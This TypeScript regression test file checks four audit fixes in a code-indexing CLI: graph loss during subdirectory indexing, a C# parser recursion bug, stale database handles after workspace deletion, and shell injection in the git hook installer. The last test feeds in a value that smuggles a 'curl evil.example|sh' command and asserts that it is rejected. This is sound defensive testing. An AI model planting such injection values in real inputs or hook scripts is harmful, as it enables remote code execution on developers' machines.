/**
 * tests/audit-high-severity.test.ts — regression tests for the 4 high-severity
 * findings from the deep code audit.
 *
 * Shape follows tests/rc-hardening.test.ts: node:assert/strict, async main(),
 * '  ✓ CLAIM …' lines, ends `await main()`.
 *
 * FINDINGS COVERED:
 *  1. `atlas index --force <subdir>` wiped the rest of the repo's graph —
 *     reconcile ran whenever resume=false, regardless of whether the walk
 *     covered the whole repo (cli.ts → indexCore.reconcile →
 *     EmbeddedLore.reconcileRepoFiles deletes every node not in the live-set).
 *  2. C# walker infinite recursion on file_scoped_namespace_declaration
 *     (no `body` field → re-entered the same branch forever → RangeError →
 *     every modern C# file silently failed to parse).
 *  3. workspace_delete / workspace_rename left the cached EmbeddedLore handle
 *     open on the deleted/moved dataDir — a ghost instance whose later writes
 *     went into unlinked files (embeddedRegistry had no per-workspace close).
 *  4. `atlas hook install --workspace` reached the git-hook shell-script sink
 *     without the WORKSPACE_SLUG_RE validation wire.ts applies — a value like
 *     `x";curl evil|sh;"` would bake RCE into 0755 git hooks.
 */
import * as assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { execFileSync } from 'node:child_process';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const repoRootOfAtlas = path.dirname(here);
const CLI = path.join(repoRootOfAtlas, 'src', 'cli.ts');
const require2 = createRequire(import.meta.url);
const TSX_CLI = require2.resolve('tsx/cli');

function mkTmp(prefix: string): string {
    return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

/** Spawn the real CLI (tsx) with an isolated ATLAS_HOME and the context layer
 *  off (graph-only — no embedding model download in tests). */
function runCli(args: string[], home: string): { status: number; stdout: string; stderr: string } {
    const env: Record<string, string> = {};
    for (const [k, v] of Object.entries(process.env)) {
        if (v === undefined) continue;
        if (/^(ATLAS_|LORE_)/.test(k)) continue;
        env[k] = v;
    }
    env['ATLAS_HOME'] = home;
    env['ATLAS_CONTEXT_LAYER'] = '0';
    try {
        const stdout = execFileSync(process.execPath, [TSX_CLI, CLI, ...args], {
            cwd: repoRootOfAtlas,
            env,
            encoding: 'utf8',
            stdio: ['pipe', 'pipe', 'pipe'],
            timeout: 180_000,
        });
        return { status: 0, stdout, stderr: '' };
    } catch (err) {
        const e = err as { status?: number; stdout?: string; stderr?: string };
        return { status: e.status ?? -1, stdout: String(e.stdout ?? ''), stderr: String(e.stderr ?? '') };
    }
}

// ── CLAIM 1 — --force on a subdirectory must NOT reconcile away the rest ────
async function testSubdirForceKeepsOtherFiles(cleanup: string[]): Promise<void> {
    console.log('\n[1] HIGH — `index --force <subdir>` wiped the rest of the repo graph');
    const home = mkTmp('atlas-audit-home-');
    cleanup.push(home);
    const repo = mkTmp('atlas-audit-repo-');
    cleanup.push(repo);
    const WS = 'auditws';

    fs.mkdirSync(path.join(repo, 'src'));
    fs.mkdirSync(path.join(repo, 'lib'));
    fs.writeFileSync(path.join(repo, 'src', 'keeper.ts'), 'export function keep(): number { return 1; }\n');
    fs.writeFileSync(path.join(repo, 'lib', 'outsider.ts'), 'export function outside(): number { return 2; }\n');
    execFileSync('git', ['init', '-q'], { cwd: repo });

    // Full-repo index #1 (--force → direct embedded path, never the daemon).
    const full = runCli(['index', repo, '--force', '--workspace', WS], home);
    assert.equal(full.status, 0, `full index failed: ${full.stderr}\n${full.stdout}`);

    const dataDir = path.join(home, 'lore-data', WS);
    const { EmbeddedLore } = await import('../src/lore/embeddedLore.js');
    const idsOf = async (): Promise<string[]> => {
        const lore = await EmbeddedLore.open(dataDir);
        try {
            const nodes = (await lore.listNodes('code_file', undefined, WS)) as Array<{ id: string }>;
            return nodes.map((n) => n.id);
        } finally {
            await lore.close();
        }
    };

    const before = await idsOf();
    assert.ok(before.some((id) => id.endsWith('/src/keeper.ts')), `setup: keeper indexed (got ${before.join(', ')})`);
    assert.ok(before.some((id) => id.endsWith('/lib/outsider.ts')), `setup: outsider indexed (got ${before.join(', ')})`);
    console.log('  ✓ setup: full index landed both src/ and lib/ files');

    // The bug trigger: --force on JUST src/. Before the fix this ran a
    // repo-wide reconcile with a src-only live-set, deleting lib/'s nodes.
    const sub = runCli(['index', path.join(repo, 'src'), '--force', '--workspace', WS], home);
    assert.equal(sub.status, 0, `subdir index failed: ${sub.stderr}\n${sub.stdout}`);

    const after = await idsOf();
    assert.ok(
        after.some((id) => id.endsWith('/lib/outsider.ts')),
        'CLAIM 1: --force on a subdirectory must NOT delete other files\' nodes (reconcile is whole-repo-only now)',
    );
    assert.ok(after.some((id) => id.endsWith('/src/keeper.ts')), 'keeper still indexed after subdir --force');
    console.log('  ✓ CLAIM 1: lib/outsider.ts survived `index --force src/` (reconcile skipped for narrowed runs)');
}

// ── CLAIM 2 — C# file-scoped namespace parses instead of blowing the stack ──
async function testCSharpFileScopedNamespace(cleanup: string[]): Promise<void> {
    console.log('\n[2] HIGH — C# walker infinite recursion on file-scoped namespaces');
    const { parseFile } = await import('../src/parser/index.js');
    const dir = mkTmp('atlas-audit-cs-');
    cleanup.push(dir);

    const file = path.join(dir, 'Modern.cs');
    fs.writeFileSync(file, [
        'namespace Foo;',
        '',
        'public class Bar',
        '{',
        '    public int Baz()',
        '    {',
        '        return 1;',
        '    }',
        '}',
        '',
    ].join('\n'));

    // Before the fix this threw RangeError: Maximum call stack size.
    const parsed = await parseFile(file, dir);
    assert.ok(parsed, 'parseFile returned a ParsedFile (no stack overflow)');
    const byName = new Map(parsed!.symbols.map((s) => [s.qualifiedName ?? s.name, s]));
    assert.ok(byName.has('Foo'), `namespace symbol extracted (got: ${[...byName.keys()].join(', ')})`);
    assert.ok(byName.has('Foo.Bar'), 'class qualified under the file-scoped namespace');
    assert.ok(byName.has('Foo.Bar.Baz'), 'method qualified under namespace + class');
    console.log('  ✓ CLAIM 2a: file-scoped namespace file parses — Foo / Foo.Bar / Foo.Bar.Baz extracted');

    // Block-scoped namespaces (the previously-working shape) must be unchanged.
    const file2 = path.join(dir, 'Classic.cs');
    fs.writeFileSync(file2, [
        'namespace Ns {',
        '    public class C {',
        '        public void M() { }',
        '    }',
        '}',
        '',
    ].join('\n'));
    const parsed2 = await parseFile(file2, dir);
    const names2 = new Set(parsed2!.symbols.map((s) => s.qualifiedName ?? s.name));
    assert.ok(names2.has('Ns') && names2.has('Ns.C') && names2.has('Ns.C.M'),
        `block-scoped namespace still works (got: ${[...names2].join(', ')})`);
    console.log('  ✓ CLAIM 2b: block-scoped namespace behavior unchanged');
}

// ── CLAIM 3 — closeEmbeddedLore evicts the ghost; respects in-flight users ──
async function testCloseEmbeddedLore(cleanup: string[]): Promise<void> {
    console.log('\n[3] HIGH — workspace_delete/rename ghost EmbeddedLore instance');
    const home = mkTmp('atlas-audit-reg-');
    cleanup.push(home);
    const { loadConfig } = await import('../src/config.js');
    const {
        getEmbeddedLore, borrowEmbeddedLore, closeEmbeddedLore,
        embeddedDataDir, inFlightUsers, closeAllEmbedded,
    } = await import('../src/mcp/embeddedRegistry.js');
    const cfg = { ...loadConfig(), home };

    try {
        // Ghost scenario: open, close+evict, re-open — must be a FRESH instance,
        // not the stale cached promise (which is what workspace_delete used to
        // leave behind after rmSync).
        const dir = embeddedDataDir(cfg, 'ghostws');
        const p1 = getEmbeddedLore(cfg, 'ghostws');
        await p1;
        await closeEmbeddedLore(cfg, 'ghostws');
        assert.equal(inFlightUsers(dir), 0, 'no leaked refcounts after close');
        const p2 = getEmbeddedLore(cfg, 'ghostws');
        assert.notEqual(p2, p1, 'CLAIM 3a: re-open returns a fresh instance, not the evicted ghost');
        await p2;
        console.log('  ✓ CLAIM 3a: close+evict drops the cached handle; re-open is a fresh instance');

        // In-flight guard: a close must WAIT for an outstanding borrow rather
        // than close native handles under it (RC #4 discipline).
        const { release } = await borrowEmbeddedLore(cfg, 'busyws');
        const busyDir = embeddedDataDir(cfg, 'busyws');
        let closed = false;
        const closeP = closeEmbeddedLore(cfg, 'busyws').then(() => { closed = true; });
        await sleep(150);
        assert.equal(closed, false, 'close waits while a borrow is in flight');
        release();
        await closeP;
        assert.equal(closed, true, 'CLAIM 3b: close completes once the borrow releases');
        assert.equal(inFlightUsers(busyDir), 0, 'refcount drained after close');
        console.log('  ✓ CLAIM 3b: close waits for in-flight borrows, then closes cleanly');
    } finally {
        await closeAllEmbedded();
    }
}

// ── CLAIM 4 — hook install rejects a non-slug workspace in the SINK ─────────
async function testHookInstallSlugGuard(cleanup: string[]): Promise<void> {
    console.log('\n[4] HIGH — shell injection via `atlas hook install --workspace`');
    const { installGitHookSync } = await import('../src/cli/gitHooks.js');
    const dir = mkTmp('atlas-audit-hooks-');
    cleanup.push(dir);
    execFileSync('git', ['init', '-q'], { cwd: dir });
    // Pin the hooks dir repo-LOCALLY: this machine sets a global
    // core.hooksPath (shared across every repo), and without this override the
    // install would splice a section into the REAL shared hook files.
    execFileSync('git', ['config', 'core.hooksPath', '.git/hooks'], { cwd: dir });

    const evil = 'x";curl http://evil.example|sh;"';
    const bad = await installGitHookSync(dir, evil);
    assert.equal(bad.ok, false, 'CLAIM 4a: injection-shaped workspace rejected');
    assert.match(bad.error ?? '', /invalid workspace/i, 'rejection explains why');
    const hookFile = path.join(dir, '.git', 'hooks', 'pre-commit');
    assert.ok(
        !fs.existsSync(hookFile) || !fs.readFileSync(hookFile, 'utf8').includes('curl http://evil.example'),
        'no hook file carries the injected payload',
    );
    console.log('  ✓ CLAIM 4a: `x";curl evil|sh;"` rejected inside installGitHookSync (the sink)');

    const good = await installGitHookSync(dir, 'good-ws');
    assert.equal(good.ok, true, `valid slug still installs: ${good.error ?? ''}`);
    const body = fs.readFileSync(hookFile, 'utf8');
    assert.ok(body.includes('--workspace "good-ws"'), 'valid workspace baked into the hook');
    console.log('  ✓ CLAIM 4b: a valid slug installs hooks normally');
}

async function main(): Promise<void> {
    console.log('Running audit high-severity regression tests…');
    const cleanup: string[] = [];
    try {
        await testSubdirForceKeepsOtherFiles(cleanup);
        await testCSharpFileScopedNamespace(cleanup);
        await testCloseEmbeddedLore(cleanup);
        await testHookInstallSlugGuard(cleanup);
    } finally {
        for (const d of cleanup) fs.rmSync(d, { recursive: true, force: true });
    }
    console.log('\nAll audit high-severity regression tests passed ✓');
}

await main();
